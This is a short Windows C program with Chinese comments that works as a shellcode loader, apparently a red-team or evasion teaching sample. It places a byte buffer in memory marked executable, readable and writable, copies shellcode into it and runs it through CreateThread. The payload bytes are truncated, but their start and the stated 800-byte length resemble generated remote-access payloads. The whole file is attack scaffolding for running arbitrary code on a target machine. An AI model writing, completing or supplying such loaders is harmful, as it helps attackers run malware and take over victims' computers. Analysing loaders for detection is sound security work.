#include <Windows.h>


// 入口函数
int wmain(int argc, TCHAR* argv[]) {

    int shellcode_size = 0; // shellcode长度
    DWORD dwThreadId; // 线程ID
    HANDLE hThread; // 线程句柄
    /* length: 800 bytes */

    unsigned char buf[] = "\xfc\x48\x83\xe4...";

    // 获取shellcode大小
    shellcode_size = sizeof(buf);

    /*
    VirtualAlloc(
        NULL, // 基址
        800,  // 大小
        MEM_COMMIT, // 内存页状态
        PAGE_EXECUTE_READWRITE // 可读可写可执行
        );
    */

    char* shellcode = (char*)VirtualAlloc(
        NULL,
        shellcode_size,
        MEM_COMMIT,
        PAGE_EXECUTE_READWRITE
    );
    // 将shellcode复制到可执行的内存页中
    CopyMemory(shellcode, buf, shellcode_size);

    hThread = CreateThread(
        NULL, // 安全描述符
        NULL, // 栈的大小
        (LPTHREAD_START_ROUTINE)shellcode, // 函数
        NULL, // 参数
        NULL, // 线程标志
        &dwThreadId // 线程ID
    );

    WaitForSingleObject(hThread, INFINITE); // 一直等待线程执行结束
    return 0;
}